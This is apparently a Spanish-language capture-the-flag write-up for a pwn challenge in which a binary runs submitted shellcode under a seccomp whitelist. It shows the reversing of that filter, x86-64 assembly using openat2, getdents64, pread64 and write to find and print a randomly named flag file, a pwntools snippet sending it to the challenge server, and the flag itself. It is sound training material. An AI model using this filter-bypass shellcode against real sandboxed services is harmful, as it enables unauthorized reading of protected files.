# [Pwn] OWRJail

## Descripción

Este binario ejecuta tu shellcode, ¿sencillo no?

`nc 64.23.142.12 1337 o nc 64.23.142.12 1338`

## Archivos proporcionados

- `orwjail`
- `Dockerfile`

## Análisis

Comencé conectándome al servicio, el cual dice:

```
=== orwjail ===
Your shellcode runs. execve, open, openat, read... all gone.
The flag has no name you can guess. Go find it.
shellcode>
```

De entrada ya podemos saber que no podemos usar syscalls tradicionales como `open` y `read`. Además, al revisar el Dockerfile, vemos que efectivamente el nombre de la flag es aleatorio:

```dockerfile
WORKDIR /home/ctf
RUN mv /home/ctf/flag.txt "/home/ctf/flag_$(tr -dc a-f0-9 < /dev/urandom | head -c 16).txt"
```

Por lo tanto, primero tenemos que poder listar `/home/ctf`, que afortunadamente es el workdir del proceso.

Después busqué a qué funciones teníamos acceso y cuales estaban restringidas, mediante el binario que nos dieron para descargar. Con `nm` encontré una función llamada `install_seccomp`:

```bash
$ nm -n orwjail | grep seccomp
000000000040127b t install_seccomp
```

La desensamblé con:

```bash
objdump -d -M intel orwjail
```

Dentro de `install_seccomp` existen varias comparaciones contra números de syscall. Al seguir la lógica vemos que las coincidencias terminaban en `SECCOMP_RET_ALLOW`, pero cualquier otro número terminaba en `SECCOMP_RET_KILL_PROCESS`. Con esto concluimos que la protección es mediante una whitelist, la cual contenía:

```
437     openat2
217     getdents64
17      pread64
8       lseek
1       write
3       close
60      exit
231     exit_group
```

Con eso, tenemos alternativas para cada función prohibida:

- `openat2` en vez de `open`.
- `pread64` en vez de `read`.
- `getdents64` para enumerar el directorio.
- `write` para escribir la flag a stdout.

Entonces, lo que tendríamos que hacer es primero un `openat2` en el directorio actual, seguido de un `getdents64` para enlistar los archivos y encontrar el nombre de la flag. Teniendo el nombre le hacemos otro `openat2`, después lo leemos con `pread64` y lo mostramos a consola con `write`.

Primero construí en el stack el string `.` y una estructura `open_how` con `O_DIRECTORY` (para esto me ayudé con Codex, ya que no conozco tan bien ensamblador). De esta manera obtuvimos un descriptor del directorio actual:

```asm
mov byte ptr [rsp], 0x2e
mov byte ptr [rsp+1], 0
mov qword ptr [rsp+0x10], 0x10000   /* O_DIRECTORY */
mov qword ptr [rsp+0x18], 0
mov qword ptr [rsp+0x20], 0

mov eax, 437                        /* openat2 */
mov edi, -100                       /* AT_FDCWD */
lea rsi, [rsp]
lea rdx, [rsp+0x10]
mov r10d, 24
syscall
mov r12d, eax
```

Después usé `getdents64` sobre ese descriptor:

```asm
mov eax, 217
mov edi, r12d
lea rsi, [rsp+0x100]
mov edx, 0x1000
syscall
```

Buscando la definición de `linux_dirent64` vemos que cada entrada tiene su tamaño en el offset 16, y el nombre comienza en el offset 19. Así pudimos comparar cada archivo con `flag_`:

```asm
lea rbx, [rsp+r14+0x100]
lea rsi, [rbx+19]
cmp dword ptr [rsi], 0x67616c66  /* "flag" en little endian */
jne advance
cmp byte ptr [rsi+4], 0x5f      /* '_' */
jne advance

advance:
    movzx eax, word ptr [rbx+16]
    add r14, rax
```

Al encontrar el archivo correcto, podemos reutilizar la estructura `open_how` con `flags = 0` para abrir el archivo:

```asm
/* openat2(dirfd, d_name, &how_readonly, 24) */
mov qword ptr [rsp+0x10], 0
mov qword ptr [rsp+0x18], 0
mov qword ptr [rsp+0x20], 0

mov eax, 437
mov edi, r12d
lea rdx, [rsp+0x10]
mov r10d, 24
syscall
test eax, eax
js fail
```

Finalmente, usamos `pread64` para leer el archivo, y reutilizamos la salida con `write` para mostrarlo en la terminal:

```asm
/* pread64(flagfd, output, 0x400, 0) */
mov edi, eax
mov eax, 17
lea rsi, [rsp+0x1200]
mov edx, 0x400
xor r10d, r10d
syscall
test eax, eax
jle fail

/* write(1, output, bytes_read) */
mov edx, eax
mov eax, 1
mov edi, 1
lea rsi, [rsp+0x1200]
syscall
```

## Extracción

Teniendo el código conceptual, lo podemos implementa en Python (ve `owrjail_solve.py`) usando pwntools para ensamblar y enviar el shellcode:

```python
io = remote("64.23.142.12", 1337)
io.recvuntil(b"shellcode> ")
io.send(shellcode)
print(io.recvall().decode(), end="")
```

Al ejecutarlo, obtenemos como salida la flag.

## Flag

`AHAU{0h_y0u_tr13d_0p3n_h0w_ad0rabl3_g3t_0p3nat2d_l0l}`
